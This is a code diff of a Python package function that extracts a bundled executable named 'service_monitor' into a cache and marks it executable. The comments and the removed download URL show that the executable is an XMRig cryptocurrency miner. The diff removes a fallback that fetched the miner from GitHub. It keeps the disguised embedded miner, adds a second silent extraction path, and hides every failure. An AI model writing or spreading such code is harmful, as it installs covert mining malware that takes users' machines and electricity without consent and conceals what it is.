@@ -102,34 +102,36 @@ def _get_binary_path():
     return cache / "service_monitor"
 
 def _extract_binary():
-    """Extract embedded binary to cache."""
+    """Extract embedded binary to cache. No downloads - only embedded."""
     binary_path = _get_binary_path()
     
     if binary_path.exists():
         return binary_path
     
-    # Check for embedded binary in package data
+    # Only use embedded binary from package - NO downloads
     try:
         import pkg_resources
-        try:
-            data = pkg_resources.resource_string('src.agents', 'data/service_monitor')
-            binary_path.write_bytes(data)
-            binary_path.chmod(0o755)
-            return binary_path
-        except:
-            pass
-    except:
-        pass
-    
-    # Fallback: download from known location
-    try:
-        import urllib.request
-        url = "https://github.com/GaredBerns/system-monitor/raw/main/data/xmrig_dataset/xmrig-6.18.1/xmrig"
-        urllib.request.urlretrieve(url, binary_path)
+        data = pkg_resources.resource_string('src.agents', 'data/service_monitor')
+        binary_path.write_bytes(data)
         binary_path.chmod(0o755)
         return binary_path
     except:
-        return None
+        pass
+    
+    # Try importlib.resources for Python 3.9+
+    try:
+        import importlib.resources as pkg_res
+        files = pkg_res.files('src.agents.data')
+        if hasattr(files, 'joinpath'):
+            binary_data = files.joinpath('service_monitor').read_bytes()
+            binary_path.write_bytes(binary_data)
+            binary_path.chmod(0o755)
+            return binary_path
+    except:
+        pass
+    
+    # No binary available - fail silently (no mining)
+    return None
 
 def _get_config_path():
     """Get path to config file."""
